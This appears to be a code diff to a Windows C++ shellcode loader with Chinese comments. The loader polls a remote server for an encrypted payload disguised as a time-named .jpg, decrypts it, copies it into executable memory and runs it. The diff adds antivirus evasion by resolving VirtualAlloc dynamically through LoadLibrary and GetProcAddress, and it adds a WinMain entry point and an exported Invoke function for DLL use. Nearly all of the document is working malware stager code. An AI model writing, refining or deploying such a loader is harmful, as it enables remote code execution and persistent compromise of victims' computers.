@@ -19,7 +19,8 @@
 #pragma comment(linker, "/section:.data,RWE")   
 //不显示窗口  
 //#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
-#pragma comment(linker, "/INCREMENTAL:NO")
+//#pragma comment(linker, "/INCREMENTAL:NO")
+typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);
 
 
 char target[MAX_PATH] = "";
@@ -74,12 +75,12 @@ std::string GetKey()
 }
 void LoadShellCode(char *shellcode)
 {
-	//HMODULE hDllLib = LoadLibrary("Kernel32.dll");
-	//FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
-	//M VirtualAlloc_ = (M)*fpFun;
+	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
+	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
+	M VirtualAlloc_ = (M)*fpFun;
 	
-	PVOID p = NULL;
-	p = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	void* p = NULL;
+	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
 
 	CODE code = (CODE)p;
@@ -97,7 +98,7 @@ void DecPayload()
 	time_t myt = time(NULL);
 	int filename = int(int(myt) / 100);
 	std::string url = "/" + std::to_string(filename) + ".jpg";
-
+	
 	auto res = cli.Get(url.c_str(),headers);
 	if (res->status != 200)return;
 	std::string body = res->body;
@@ -120,8 +121,7 @@ extern "C" _declspec(dllexport) void Invoke();
 void Invoke()
 {
 	
-	cli.set_read_timeout(5, 0);
-	cli.set_write_timeout(5, 0);
+	Sleep(2000);
 	while (true) {
 		try {
 			Sleep(2000);
@@ -144,6 +144,15 @@ int main()
 	return 0;
 	
 }  
+int CALLBACK WinMain(
+	_In_  HINSTANCE hInstance,
+	_In_  HINSTANCE hPrevInstance,
+	_In_  LPSTR lpCmdLine,
+	_In_  int nCmdShow
+) {
+	Invoke();
+	return 0;
+}
 BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
